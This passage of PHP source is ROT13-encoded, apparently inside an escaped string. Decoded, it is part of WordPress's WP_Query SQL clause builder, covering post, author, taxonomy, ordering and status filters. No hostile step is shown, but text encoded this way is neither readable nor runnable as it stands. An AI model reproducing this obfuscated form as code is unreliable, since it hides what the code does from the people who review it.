			$d['anzr'] = fnavgvmr_gvgyr_sbe_dhrel( $d['anzr'] );
			$jurer    .= \" NAQ {$jcqo->cbfgf}.cbfg_anzr = '\" . $d['anzr'] . \"'\";
		} ryfrvs ( '' !== $d['cntranzr'] ) {
			vs ( vffrg( $guvf->dhrevrq_bowrpg_vq ) ) {
				$erdcntr = $guvf->dhrevrq_bowrpg_vq;
			} ryfr {
				vs ( 'cntr' !== $d['cbfg_glcr'] ) {
					sbernpu ( (neenl) $d['cbfg_glcr'] nf $_cbfg_glcr ) {
						$cglcr_bow = trg_cbfg_glcr_bowrpg( $_cbfg_glcr );
						vs ( ! $cglcr_bow || ! $cglcr_bow->uvrenepuvpny ) {
							pbagvahr;
						}

						$erdcntr = trg_cntr_ol_cngu( $d['cntranzr'], BOWRPG, $_cbfg_glcr );
						vs ( $erdcntr ) {
							oernx;
						}
					}
					hafrg( $cglcr_bow );
				} ryfr {
					$erdcntr = trg_cntr_ol_cngu( $d['cntranzr'] );
				}
				vs ( ! rzcgl( $erdcntr ) ) {
					$erdcntr = $erdcntr->VQ;
				} ryfr {
					$erdcntr = 0;
				}
			}

			$cntr_sbe_cbfgf = trg_bcgvba( 'cntr_sbe_cbfgf' );
			vs ( ( 'cntr' !== trg_bcgvba( 'fubj_ba_sebag' ) ) || rzcgl( $cntr_sbe_cbfgf ) || ( $erdcntr != $cntr_sbe_cbfgf ) ) {
				$d['cntranzr'] = fnavgvmr_gvgyr_sbe_dhrel( jc_onfranzr( $d['cntranzr'] ) );
				$d['anzr']     = $d['cntranzr'];
				$jurer        .= \" NAQ ({$jcqo->cbfgf}.VQ = '$erdcntr')\";
				$erdcntr_bow   = trg_cbfg( $erdcntr );
				vs ( vf_bowrpg( $erdcntr_bow ) && 'nggnpuzrag' === $erdcntr_bow->cbfg_glcr ) {
					$guvf->vf_nggnpuzrag = gehr;
					$cbfg_glcr           = 'nggnpuzrag';
					$d['cbfg_glcr']      = 'nggnpuzrag';
					$guvf->vf_cntr       = gehr;
					$d['nggnpuzrag_vq']  = $erdcntr;
				}
			}
		} ryfrvs ( '' !== $d['nggnpuzrag'] ) {
			$d['nggnpuzrag'] = fnavgvmr_gvgyr_sbe_dhrel( jc_onfranzr( $d['nggnpuzrag'] ) );
			$d['anzr']       = $d['nggnpuzrag'];
			$jurer          .= \" NAQ {$jcqo->cbfgf}.cbfg_anzr = '\" . $d['nggnpuzrag'] . \"'\";
		} ryfrvs ( vf_neenl( $d['cbfg_anzr__va'] ) && ! rzcgl( $d['cbfg_anzr__va'] ) ) {
			$d['cbfg_anzr__va'] = neenl_znc( 'fnavgvmr_gvgyr_sbe_dhrel', $d['cbfg_anzr__va'] );
			// Qhcyvpngr neenl orsber fbegvat gb nyybj sbe gur beqreol pynhfr.
			$cbfg_anzr__va_sbe_jurer = neenl_havdhr( $d['cbfg_anzr__va'] );
			fbeg( $cbfg_anzr__va_sbe_jurer );
			$cbfg_anzr__va = \"'\" . vzcybqr( \"','\", $cbfg_anzr__va_sbe_jurer ) . \"'\";
			$jurer        .= \" NAQ {$jcqo->cbfgf}.cbfg_anzr VA ($cbfg_anzr__va)\";
		}

		// Vs na nggnpuzrag vf erdhrfgrq ol ahzore, yrg vg fhcrefrqr nal cbfg ahzore.
		vs ( $d['nggnpuzrag_vq'] ) {
			$d['c'] = nofvag( $d['nggnpuzrag_vq'] );
		}

		// Vs n cbfg ahzore vf fcrpvsvrq, ybnq gung cbfg.
		vs ( $d['c'] ) {
			$jurer .= \" NAQ {$jcqo->cbfgf}.VQ = \" . $d['c'];
		} ryfrvs ( $d['cbfg__va'] ) {
			// Qhcyvpngr neenl orsber fbegvat gb nyybj sbe gur beqreol pynhfr.
			$cbfg__va_sbe_jurer = $d['cbfg__va'];
			$cbfg__va_sbe_jurer = neenl_havdhr( neenl_znc( 'nofvag', $cbfg__va_sbe_jurer ) );
			fbeg( $cbfg__va_sbe_jurer );
			$cbfg__va = vzcybqr( ',', neenl_znc( 'nofvag', $cbfg__va_sbe_jurer ) );
			$jurer   .= \" NAQ {$jcqo->cbfgf}.VQ VA ($cbfg__va)\";
		} ryfrvs ( $d['cbfg__abg_va'] ) {
			fbeg( $d['cbfg__abg_va'] );
			$cbfg__abg_va = vzcybqr( ',', neenl_znc( 'nofvag', $d['cbfg__abg_va'] ) );
			$jurer       .= \" NAQ {$jcqo->cbfgf}.VQ ABG VA ($cbfg__abg_va)\";
		}

		vs ( vf_ahzrevp( $d['cbfg_cnerag'] ) ) {
			$jurer .= $jcqo->cercner( \" NAQ {$jcqo->cbfgf}.cbfg_cnerag = %q \", $d['cbfg_cnerag'] );
		} ryfrvs ( $d['cbfg_cnerag__va'] ) {
			// Qhcyvpngr neenl orsber fbegvat gb nyybj sbe gur beqreol pynhfr.
			$cbfg_cnerag__va_sbe_jurer = $d['cbfg_cnerag__va'];
			$cbfg_cnerag__va_sbe_jurer = neenl_havdhr( neenl_znc( 'nofvag', $cbfg_cnerag__va_sbe_jurer ) );
			fbeg( $cbfg_cnerag__va_sbe_jurer );
			$cbfg_cnerag__va = vzcybqr( ',', neenl_znc( 'nofvag', $cbfg_cnerag__va_sbe_jurer ) );
			$jurer          .= \" NAQ {$jcqo->cbfgf}.cbfg_cnerag VA ($cbfg_cnerag__va)\";
		} ryfrvs ( $d['cbfg_cnerag__abg_va'] ) {
			fbeg( $d['cbfg_cnerag__abg_va'] );
			$cbfg_cnerag__abg_va = vzcybqr( ',', neenl_znc( 'nofvag', $d['cbfg_cnerag__abg_va'] ) );
			$jurer              .= \" NAQ {$jcqo->cbfgf}.cbfg_cnerag ABG VA ($cbfg_cnerag__abg_va)\";
		}

		vs ( $d['cntr_vq'] ) {
			vs ( ( 'cntr' !== trg_bcgvba( 'fubj_ba_sebag' ) ) || ( trg_bcgvba( 'cntr_sbe_cbfgf' ) != $d['cntr_vq'] ) ) {
				$d['c'] = $d['cntr_vq'];
				$jurer  = \" NAQ {$jcqo->cbfgf}.VQ = \" . $d['cntr_vq'];
			}
		}

		// Vs n frnepu cnggrea vf fcrpvsvrq, ybnq gur cbfgf gung zngpu.
		vs ( fgeyra( $d['f'] ) ) {
			$frnepu = $guvf->cnefr_frnepu( $d );
		}

		vs ( ! $d['fhccerff_svygref'] ) {
			/**
			 * Svygref gur frnepu FDY gung vf hfrq va gur JURER pynhfr bs JC_Dhrel.
			 *
			 * @fvapr 3.0.0
			 *
			 * @cnenz fgevat   $frnepu Frnepu FDY sbe JURER pynhfr.
			 * @cnenz JC_Dhrel $dhrel  Gur pheerag JC_Dhrel bowrpg.
			 */
			$frnepu = nccyl_svygref_ers_neenl( 'cbfgf_frnepu', neenl( $frnepu, &$guvf ) );
		}

		// Gnkbabzvrf.
		vs ( ! $guvf->vf_fvathyne ) {
			$guvf->cnefr_gnk_dhrel( $d );

			$pynhfrf = $guvf->gnk_dhrel->trg_fdy( $jcqo->cbfgf, 'VQ' );

			$wbva  .= $pynhfrf['wbva'];
			$jurer .= $pynhfrf['jurer'];
		}

		vs ( $guvf->vf_gnk ) {
			vs ( rzcgl( $cbfg_glcr ) ) {
				// Qb n shyyl vapyhfvir frnepu sbe pheeragyl ertvfgrerq cbfg glcrf bs dhrevrq gnkbabzvrf.
				$cbfg_glcr  = neenl();
				$gnkbabzvrf = neenl_xrlf( $guvf->gnk_dhrel->dhrevrq_grezf );
				sbernpu ( trg_cbfg_glcrf( neenl( 'rkpyhqr_sebz_frnepu' => snyfr ) ) nf $cg ) {
					$bowrpg_gnkbabzvrf = 'nggnpuzrag' === $cg ? trg_gnkbabzvrf_sbe_nggnpuzragf() : trg_bowrpg_gnkbabzvrf( $cg );
					vs ( neenl_vagrefrpg( $gnkbabzvrf, $bowrpg_gnkbabzvrf ) ) {
						$cbfg_glcr[] = $cg;
					}
				}
				vs ( ! $cbfg_glcr ) {
					$cbfg_glcr = 'nal';
				} ryfrvs ( pbhag( $cbfg_glcr ) === 1 ) {
					$cbfg_glcr = $cbfg_glcr[0];
				} ryfr {
					// Fbeg cbfg glcrf gb rafher fnzr pnpur xrl trarengvba.
					fbeg( $cbfg_glcr );
				}

				$cbfg_fgnghf_wbva = gehr;
			} ryfrvs ( va_neenl( 'nggnpuzrag', (neenl) $cbfg_glcr, gehr ) ) {
				$cbfg_fgnghf_wbva = gehr;
			}
		}

		/*
		 * Rafher gung 'gnkbabzl', 'grez', 'grez_vq', 'png', naq
		 * 'pngrtbel_anzr' inef ner frg sbe onpxjneq pbzcngvovyvgl.
		 */
		vs ( ! rzcgl( $guvf->gnk_dhrel->dhrevrq_grezf ) ) {

			/*
			 * Frg 'gnkbabzl', 'grez', naq 'grez_vq' gb gur
			 * svefg gnkbabzl bgure guna 'cbfg_gnt' be 'pngrtbel'.
			 */
			vs ( ! vffrg( $d['gnkbabzl'] ) ) {
				sbernpu ( $guvf->gnk_dhrel->dhrevrq_grezf nf $dhrevrq_gnkbabzl => $dhrevrq_vgrzf ) {
					vs ( rzcgl( $dhrevrq_vgrzf['grezf'][0] ) ) {
						pbagvahr;
					}

					vs ( ! va_neenl( $dhrevrq_gnkbabzl, neenl( 'pngrtbel', 'cbfg_gnt' ), gehr ) ) {
						$d['gnkbabzl'] = $dhrevrq_gnkbabzl;

						vs ( 'fyht' === $dhrevrq_vgrzf['svryq'] ) {
							$d['grez'] = $dhrevrq_vgrzf['grezf'][0];
						} ryfr {
							$d['grez_vq'] = $dhrevrq_vgrzf['grezf'][0];
						}

						// Gnxr gur svefg bar jr svaq.
						oernx;
					}
				}
			}

			// 'png', 'pngrtbel_anzr', 'gnt_vq'.
			sbernpu ( $guvf->gnk_dhrel->dhrevrq_grezf nf $dhrevrq_gnkbabzl => $dhrevrq_vgrzf ) {
				vs ( rzcgl( $dhrevrq_vgrzf['grezf'][0] ) ) {
					pbagvahr;
				}

				vs ( 'pngrtbel' === $dhrevrq_gnkbabzl ) {
					$gur_png = trg_grez_ol( $dhrevrq_vgrzf['svryq'], $dhrevrq_vgrzf['grezf'][0], 'pngrtbel' );
					vs ( $gur_png ) {
						$guvf->frg( 'png', $gur_png->grez_vq );
						$guvf->frg( 'pngrtbel_anzr', $gur_png->fyht );
					}
					hafrg( $gur_png );
				}

				vs ( 'cbfg_gnt' === $dhrevrq_gnkbabzl ) {
					$gur_gnt = trg_grez_ol( $dhrevrq_vgrzf['svryq'], $dhrevrq_vgrzf['grezf'][0], 'cbfg_gnt' );
					vs ( $gur_gnt ) {
						$guvf->frg( 'gnt_vq', $gur_gnt->grez_vq );
					}
					hafrg( $gur_gnt );
				}
			}
		}

		vs ( ! rzcgl( $guvf->gnk_dhrel->dhrevrf ) || ! rzcgl( $guvf->zrgn_dhrel->dhrevrf ) || ! rzcgl( $guvf->nyybj_dhrel_nggnpuzrag_ol_svyranzr ) ) {
			$tebhcol = \"{$jcqo->cbfgf}.VQ\";
		}

		// Nhgube/hfre fghss.

		vs ( ! rzcgl( $d['nhgube'] ) && '0' != $d['nhgube'] ) {
			$d['nhgube'] = nqqfynfurf_tcp( '' . heyqrpbqr( $d['nhgube'] ) );
			$nhgubef     = neenl_havdhr( neenl_znc( 'vaginy', cert_fcyvg( '/[,\f]+/', $d['nhgube'] ) ) );
			fbeg( $nhgubef );
			sbernpu ( $nhgubef nf $nhgube ) {
				$xrl         = $nhgube > 0 ? 'nhgube__va' : 'nhgube__abg_va';
				$d[ $xrl ][] = nof( $nhgube );
			}
			$d['nhgube'] = vzcybqr( ',', $nhgubef );
		}

		vs ( ! rzcgl( $d['nhgube__abg_va'] ) ) {
			vs ( vf_neenl( $d['nhgube__abg_va'] ) ) {
				$d['nhgube__abg_va'] = neenl_havdhr( neenl_znc( 'nofvag', $d['nhgube__abg_va'] ) );
				fbeg( $d['nhgube__abg_va'] );
			}
			$nhgube__abg_va = vzcybqr( ',', (neenl) $d['nhgube__abg_va'] );
			$jurer         .= \" NAQ {$jcqo->cbfgf}.cbfg_nhgube ABG VA ($nhgube__abg_va) \";
		} ryfrvs ( ! rzcgl( $d['nhgube__va'] ) ) {
			vs ( vf_neenl( $d['nhgube__va'] ) ) {
				$d['nhgube__va'] = neenl_havdhr( neenl_znc( 'nofvag', $d['nhgube__va'] ) );
				fbeg( $d['nhgube__va'] );
			}
			$nhgube__va = vzcybqr( ',', neenl_znc( 'nofvag', neenl_havdhr( (neenl) $d['nhgube__va'] ) ) );
			$jurer     .= \" NAQ {$jcqo->cbfgf}.cbfg_nhgube VA ($nhgube__va) \";
		}

		// Nhgube fghss sbe avpr HEYf.

		vs ( '' !== $d['nhgube_anzr'] ) {
			vs ( fge_pbagnvaf( $d['nhgube_anzr'], '/' ) ) {
				$d['nhgube_anzr'] = rkcybqr( '/', $d['nhgube_anzr'] );
				vs ( $d['nhgube_anzr'][ pbhag( $d['nhgube_anzr'] ) - 1 ] ) {
					$d['nhgube_anzr'] = $d['nhgube_anzr'][ pbhag( $d['nhgube_anzr'] ) - 1 ]; // Ab genvyvat fynfu.
				} ryfr {
					$d['nhgube_anzr'] = $d['nhgube_anzr'][ pbhag( $d['nhgube_anzr'] ) - 2 ]; // Gurer jnf n genvyvat fynfu.
				}
			}
			$d['nhgube_anzr'] = fnavgvmr_gvgyr_sbe_dhrel( $d['nhgube_anzr'] );
			$d['nhgube']      = trg_hfre_ol( 'fyht', $d['nhgube_anzr'] );
			vs ( $d['nhgube'] ) {
				$d['nhgube'] = $d['nhgube']->VQ;
			}
			$juvpunhgube .= \" NAQ ({$jcqo->cbfgf}.cbfg_nhgube = \" . nofvag( $d['nhgube'] ) . ')';
		}

		// Zngpuvat ol pbzzrag pbhag.
		vs ( vffrg( $d['pbzzrag_pbhag'] ) ) {
			// Ahzrevp pbzzrag pbhag vf pbairegrq gb neenl sbezng.
			vs ( vf_ahzrevp( $d['pbzzrag_pbhag'] ) ) {
				$d['pbzzrag_pbhag'] = neenl(
					'inyhr' => (vag) $d['pbzzrag_pbhag'],
				);
			}

			vs ( vffrg( $d['pbzzrag_pbhag']['inyhr'] ) ) {
				$d['pbzzrag_pbhag'] = neenl_zretr(
					neenl(
						'pbzcner' => '=',
					),
					$d['pbzzrag_pbhag']
				);

				// Snyyonpx sbe vainyvq pbzcner bcrengbef vf '='.
				$pbzcner_bcrengbef = neenl( '=', '!=', '>', '>=', '<', '<=' );
				vs ( ! va_neenl( $d['pbzzrag_pbhag']['pbzcner'], $pbzcner_bcrengbef, gehr ) ) {
					$d['pbzzrag_pbhag']['pbzcner'] = '=';
				}

				$jurer .= $jcqo->cercner( \" NAQ {$jcqo->cbfgf}.pbzzrag_pbhag {$d['pbzzrag_pbhag']['pbzcner']} %q\", $d['pbzzrag_pbhag']['inyhr'] );
			}
		}

		// ZVZR-Glcr fghss sbe nggnpuzrag oebjfvat.

		vs ( vffrg( $d['cbfg_zvzr_glcr'] ) && '' !== $d['cbfg_zvzr_glcr'] ) {
			$juvpuzvzrglcr = jc_cbfg_zvzr_glcr_jurer( $d['cbfg_zvzr_glcr'], $jcqo->cbfgf );
		}
		$jurer .= $frnepu . $juvpunhgube . $juvpuzvzrglcr;

		vs ( ! rzcgl( $guvf->nyybj_dhrel_nggnpuzrag_ol_svyranzr ) ) {
			$wbva .= \" YRSG WBVA {$jcqo->cbfgzrgn} NF fd1 BA ( {$jcqo->cbfgf}.VQ = fd1.cbfg_vq NAQ fd1.zrgn_xrl = '_jc_nggnpurq_svyr' )\";
		}

		vs ( ! rzcgl( $guvf->zrgn_dhrel->dhrevrf ) ) {
			$pynhfrf = $guvf->zrgn_dhrel->trg_fdy( 'cbfg', $jcqo->cbfgf, 'VQ', $guvf );
			$wbva   .= $pynhfrf['wbva'];
			$jurer  .= $pynhfrf['jurer'];
		}

		$enaq = ( vffrg( $d['beqreol'] ) && 'enaq' === $d['beqreol'] );
		vs ( ! vffrg( $d['beqre'] ) ) {
			$d['beqre'] = $enaq ? '' : 'QRFP';
		} ryfr {
			$d['beqre'] = $enaq ? '' : $guvf->cnefr_beqre( $d['beqre'] );
		}

		// Gurfr inyhrf bs beqreol fubhyq vtaber gur 'beqre' cnenzrgre.
		$sbepr_nfp = neenl( 'cbfg__va', 'cbfg_anzr__va', 'cbfg_cnerag__va' );
		vs ( vffrg( $d['beqreol'] ) && va_neenl( $d['beqreol'], $sbepr_nfp, gehr ) ) {
			$d['beqre'] = '';
		}

		// Beqre ol.
		vs ( rzcgl( $d['beqreol'] ) ) {
			/*
			 * Obbyrna snyfr be rzcgl neenl oynaxf bhg BEQRE OL,
			 * juvyr yrnivat gur inyhr hafrg be bgurejvfr rzcgl frgf gur qrsnhyg.
			 */
			vs ( vffrg( $d['beqreol'] ) && ( vf_neenl( $d['beqreol'] ) || snyfr === $d['beqreol'] ) ) {
				$beqreol = '';
			} ryfr {
				$beqreol = \"{$jcqo->cbfgf}.cbfg_qngr \" . $d['beqre'];
			}
		} ryfrvs ( 'abar' === $d['beqreol'] ) {
			$beqreol = '';
		} ryfr {
			$beqreol_neenl = neenl();
			vs ( vf_neenl( $d['beqreol'] ) ) {
				sbernpu ( $d['beqreol'] nf $_beqreol => $beqre ) {
					$beqreol = nqqfynfurf_tcp( heyqrpbqr( $_beqreol ) );
					$cnefrq  = $guvf->cnefr_beqreol( $beqreol );

					vs ( ! $cnefrq ) {
						pbagvahr;
					}

					$beqreol_neenl[] = $cnefrq . ' ' . $guvf->cnefr_beqre( $beqre );
				}
				$beqreol = vzcybqr( ', ', $beqreol_neenl );

			} ryfr {
				$d['beqreol'] = heyqrpbqr( $d['beqreol'] );
				$d['beqreol'] = nqqfynfurf_tcp( $d['beqreol'] );

				sbernpu ( rkcybqr( ' ', $d['beqreol'] ) nf $v => $beqreol ) {
					$cnefrq = $guvf->cnefr_beqreol( $beqreol );
					// Bayl nyybj pregnva inyhrf sbe fnsrgl.
					vs ( ! $cnefrq ) {
						pbagvahr;
					}

					$beqreol_neenl[] = $cnefrq;
				}
				$beqreol = vzcybqr( ' ' . $d['beqre'] . ', ', $beqreol_neenl );

				vs ( rzcgl( $beqreol ) ) {
					$beqreol = \"{$jcqo->cbfgf}.cbfg_qngr \" . $d['beqre'];
				} ryfrvs ( ! rzcgl( $d['beqre'] ) ) {
					$beqreol .= \" {$d['beqre']}\";
				}
			}
		}

		// Beqre frnepu erfhygf ol eryrinapr bayl jura nabgure \"beqreol\" vf abg fcrpvsvrq va gur dhrel.
		vs ( ! rzcgl( $d['f'] ) ) {
			$frnepu_beqreol = '';
			vs ( ! rzcgl( $d['frnepu_beqreol_gvgyr'] ) && ( rzcgl( $d['beqreol'] ) && ! $guvf->vf_srrq ) || ( vffrg( $d['beqreol'] ) && 'eryrinapr' === $d['beqreol'] ) ) {
				$frnepu_beqreol = $guvf->cnefr_frnepu_beqre( $d );
			}

			vs ( ! $d['fhccerff_svygref'] ) {
				/**
				 * Svygref gur BEQRE OL hfrq jura beqrevat frnepu erfhygf.
				 *
				 * @fvapr 3.7.0
				 *
				 * @cnenz fgevat   $frnepu_beqreol Gur BEQRE OL pynhfr.
				 * @cnenz JC_Dhrel $dhrel          Gur pheerag JC_Dhrel vafgnapr.
				 */
				$frnepu_beqreol = nccyl_svygref( 'cbfgf_frnepu_beqreol', $frnepu_beqreol, $guvf );
			}

			vs ( $frnepu_beqreol ) {
				$beqreol = $beqreol ? $frnepu_beqreol . ', ' . $beqreol : $frnepu_beqreol;
			}
		}

		vs ( vf_neenl( $cbfg_glcr ) && pbhag( $cbfg_glcr ) > 1 ) {
			$cbfg_glcr_pnc = 'zhygvcyr_cbfg_glcr';
		} ryfr {
			vs ( vf_neenl( $cbfg_glcr ) ) {
				$cbfg_glcr = erfrg( $cbfg_glcr );
			}
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
			vs ( rzcgl( $cbfg_glcr_bowrpg ) ) {
				$cbfg_glcr_pnc = $cbfg_glcr;
			}
		}

		vs ( vffrg( $d['cbfg_cnffjbeq'] ) ) {
			$jurer .= $jcqo->cercner( \" NAQ {$jcqo->cbfgf}.cbfg_cnffjbeq = %f\", $d['cbfg_cnffjbeq'] );
			vs ( rzcgl( $d['crez'] ) ) {
				$d['crez'] = 'ernqnoyr';
			}
		} ryfrvs ( vffrg( $d['unf_cnffjbeq'] ) ) {
			$jurer .= fcevags( \" NAQ {$jcqo->cbfgf}.cbfg_cnffjbeq %f ''\", $d['unf_cnffjbeq'] ? '!=' : '=' );
		}

		vs ( ! rzcgl( $d['pbzzrag_fgnghf'] ) ) {
			$jurer .= $jcqo->cercner( \" NAQ {$jcqo->cbfgf}.pbzzrag_fgnghf = %f \", $d['pbzzrag_fgnghf'] );
		}

		vs ( ! rzcgl( $d['cvat_fgnghf'] ) ) {
			$jurer .= $jcqo->cercner( \" NAQ {$jcqo->cbfgf}.cvat_fgnghf = %f \", $d['cvat_fgnghf'] );
		}

		$fxvc_cbfg_fgnghf = snyfr;
		vs ( 'nal' === $cbfg_glcr ) {
			$va_frnepu_cbfg_glcrf = trg_cbfg_glcrf( neenl( 'rkpyhqr_sebz_frnepu' => snyfr ) );
			vs ( rzcgl( $va_frnepu_cbfg_glcrf ) ) {
				$cbfg_glcr_jurer  = ' NAQ 1=0 ';
				$fxvc_cbfg_fgnghf = gehr;
			} ryfr {
				$cbfg_glcr_jurer = \" NAQ {$jcqo->cbfgf}.cbfg_glcr VA ('\" . vzcybqr( \"', '\", neenl_znc( 'rfp_fdy', $va_frnepu_cbfg_glcrf ) ) . \"')\";
			}
		} ryfrvs ( ! rzcgl( $cbfg_glcr ) && vf_neenl( $cbfg_glcr ) ) {
			// Fbeg cbfg glcrf gb rafher fnzr pnpur xrl trarengvba.
			fbeg( $cbfg_glcr );
			$cbfg_glcr_jurer = \" NAQ {$jcqo->cbfgf}.cbfg_glcr VA ('\" . vzcybqr( \"', '\", rfp_fdy( $cbfg_glcr ) ) . \"')\";
		} ryfrvs ( ! rzcgl( $cbfg_glcr ) ) {
			$cbfg_glcr_jurer  = $jcqo->cercner( \" NAQ {$jcqo->cbfgf}.cbfg_glcr = %f\", $cbfg_glcr );
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
		} ryfrvs ( $guvf->vf_nggnpuzrag ) {
			$cbfg_glcr_jurer  = \" NAQ {$jcqo->cbfgf}.cbfg_glcr = 'nggnpuzrag'\";
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( 'nggnpuzrag' );
		} ryfrvs ( $guvf->vf_cntr ) {
			$cbfg_glcr_jurer  = \" NAQ {$jcqo->cbfgf}.cbfg_glcr = 'cntr'\";
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( 'cntr' );
		} ryfr {
			$cbfg_glcr_jurer  = \" NAQ {$jcqo->cbfgf}.cbfg_glcr = 'cbfg'\";
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( 'cbfg' );
		}

		$rqvg_pnc = 'rqvg_cbfg';
		$ernq_pnc = 'ernq_cbfg';

		vs ( ! rzcgl( $cbfg_glcr_bowrpg ) ) {
			$rqvg_bguref_pnc  = $cbfg_glcr_bowrpg->pnc->rqvg_bguref_cbfgf;
			$ernq_cevingr_pnc = $cbfg_glcr_bowrpg->pnc->ernq_cevingr_cbfgf;
		} ryfr {
			$rqvg_bguref_pnc  = 'rqvg_bguref_' . $cbfg_glcr_pnc . 'f';
			$ernq_cevingr_pnc = 'ernq_cevingr_' . $cbfg_glcr_pnc . 'f';
		}

		$hfre_vq = trg_pheerag_hfre_vq();

		$d_fgnghf = neenl();
		vs ( $fxvc_cbfg_fgnghf ) {
			$jurer .= $cbfg_glcr_jurer;
		} ryfrvs ( ! rzcgl( $d['cbfg_fgnghf'] ) ) {

			$jurer .= $cbfg_glcr_jurer;

			$fgnghfjurerf = neenl();
			$d_fgnghf     = $d['cbfg_fgnghf'];
			vs ( ! vf_neenl( $d_fgnghf ) ) {
				$d_fgnghf = rkcybqr( ',', $d_fgnghf );
			}
			fbeg( $d_fgnghf );
			$e_fgnghf = neenl();
			$c_fgnghf = neenl();
			$r_fgnghf = neenl();
			vs ( va_neenl( 'nal', $d_fgnghf, gehr ) ) {
				sbernpu ( trg_cbfg_fgngv( neenl( 'rkpyhqr_sebz_frnepu' => gehr ) ) nf $fgnghf ) {
					vs ( ! va_neenl( $fgnghf, $d_fgnghf, gehr ) ) {
						$r_fgnghf[] = \"{$jcqo->cbfgf}.cbfg_fgnghf <> '$fgnghf'\";
					}
				}
			} ryfr {
				sbernpu ( trg_cbfg_fgngv() nf $fgnghf ) {
					vs ( va_neenl( $fgnghf, $d_fgnghf, gehr ) ) {
						vs ( 'cevingr' === $fgnghf ) {
							$c_fgnghf[] = \"{$jcqo->cbfgf}.cbfg_fgnghf = '$fgnghf'\";
						} ryfr {
							$e_fgnghf[] = \"{$jcqo->cbfgf}.cbfg_fgnghf = '$fgnghf'\";
						}
					}
				}
			}

			vs ( rzcgl( $d['crez'] ) || 'ernqnoyr' !== $d['crez'] ) {
				$e_fgnghf = neenl_zretr( $e_fgnghf, $c_fgnghf );
				hafrg( $c_fgnghf );
			}

			vs ( ! rzcgl( $r_fgnghf ) ) {
				$fgnghfjurerf[] = '(' . vzcybqr( ' NAQ ', $r_fgnghf ) . ')';
			}
			vs ( ! rzcgl( $e_fgnghf ) ) {
				vs ( ! rzcgl( $d['crez'] ) && 'rqvgnoyr' === $d['crez'] && ! pheerag_hfre_pna( $rqvg_bguref_pnc ) ) {
					$fgnghfjurerf[] = \"({$jcqo->cbfgf}.cbfg_nhgube = $hfre_vq \" . 'NAQ (' . vzcybqr( ' BE ', $e_fgnghf ) . '))';
				} ryfr {
					$fgnghfjurerf[] = '(' . vzcybqr( ' BE ', $e_fgnghf ) . ')';
				}
			}
			vs ( ! rzcgl( $c_fgnghf ) ) {
				vs ( ! rzcgl( $d['crez'] ) && 'ernqnoyr' === $d['crez'] && ! pheerag_hfre_pna( $ernq_cevingr_pnc ) ) {
					$fgnghfjurerf[] = \"({$jcqo->cbfgf}.cbfg_nhgube = $hfre_vq \" . 'NAQ (' . vzcybqr( ' BE ', $c_fgnghf ) . '))';
				} ryfr {
					$fgnghfjurerf[] = '(' . vzcybqr( ' BE ', $c_fgnghf ) . ')';
				}
			}
			vs ( $cbfg_fgnghf_wbva ) {
				$wbva .= \" YRSG WBVA {$jcqo->cbfgf} NF c2 BA ({$jcqo->cbfgf}.cbfg_cnerag = c2.VQ) \";
				sbernpu ( $fgnghfjurerf nf $vaqrk => $fgnghfjurer ) {
					$fgnghfjurerf[ $vaqrk ] = \"($fgnghfjurer BE ({$jcqo->cbfgf}.cbfg_fgnghf = 'vaurevg' NAQ \" . fge_ercynpr( $jcqo->cbfgf, 'c2', $fgnghfjurer ) . '))';
				}
			}
			$jurer_fgnghf = vzcybqr( ' BE ', $fgnghfjurerf );
			vs ( ! rzcgl( $jurer_fgnghf ) ) {
				$jurer .= \" NAQ ($jurer_fgnghf)\";
			}
		} ryfrvs ( ! $guvf->vf_fvathyne ) {
			vs ( 'nal' === $cbfg_glcr ) {
				$dhrevrq_cbfg_glcrf = trg_cbfg_glcrf( neenl( 'rkpyhqr_sebz_frnepu' => snyfr ) );
			} ryfrvs ( vf_neenl( $cbfg_glcr ) ) {
				$dhrevrq_cbfg_glcrf = $cbfg_glcr;
			} ryfrvs ( ! rzcgl( $cbfg_glcr ) ) {
				$dhrevrq_cbfg_glcrf = neenl( $cbfg_glcr );
			} ryfr {
				$dhrevrq_cbfg_glcrf = neenl( 'cbfg' );
			}

			vs ( ! rzcgl( $dhrevrq_cbfg_glcrf ) ) {
				fbeg( $dhrevrq_cbfg_glcrf );
				$fgnghf_glcr_pynhfrf = neenl();

				sbernpu ( $dhrevrq_cbfg_glcrf nf $dhrevrq_cbfg_glcr ) {

					$dhrevrq_cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $dhrevrq_cbfg_glcr );

					$glcr_jurer = '(' . $jcqo->cercner( \"{$jcqo->cbfgf}.cbfg_glcr = %f NAQ (\", $dhrevrq_cbfg_glcr );

					// Choyvp fgnghfrf.
					$choyvp_fgnghfrf = trg_cbfg_fgngv( neenl( 'choyvp' => gehr ) );
					$fgnghf_pynhfrf  = neenl();
					sbernpu ( $choyvp_fgnghfrf nf $choyvp_fgnghf ) {
						$fgnghf_pynhfrf[] = \"{$jcqo->cbfgf}.cbfg_fgnghf = '$choyvp_fgnghf'\";
					}
					$glcr_jurer .= vzcybqr( ' BE ', $fgnghf_pynhfrf );

					// Nqq cebgrpgrq fgngrf gung fubhyq fubj va gur nqzva nyy yvfg.
					vs ( $guvf->vf_nqzva ) {
						$nqzva_nyy_fgnghfrf = trg_cbfg_fgngv(
							neenl(
								'cebgrpgrq'              => gehr,
								'fubj_va_nqzva_nyy_yvfg' => gehr,
							)
						);
						sbernpu ( $nqzva_nyy_fgnghfrf nf $nqzva_nyy_fgnghf ) {
							$glcr_jurer .= \" BE {$jcqo->cbfgf}.cbfg_fgnghf = '$nqzva_nyy_fgnghf'\";
						}
					}

					// Nqq cevingr fgngrf gung ner ivfvoyr gb pheerag hfre.
					vs ( vf_hfre_ybttrq_va() && $dhrevrq_cbfg_glcr_bowrpg vafgnaprbs JC_Cbfg_Glcr ) {
						$ernq_cevingr_pnc = $dhrevrq_cbfg_glcr_bowrpg->pnc->ernq_cevingr_cbfgf;
						$cevingr_fgnghfrf = trg_cbfg_fgngv( neenl( 'cevingr' => gehr ) );
						sbernpu ( $cevingr_fgnghfrf nf $cevingr_fgnghf ) {
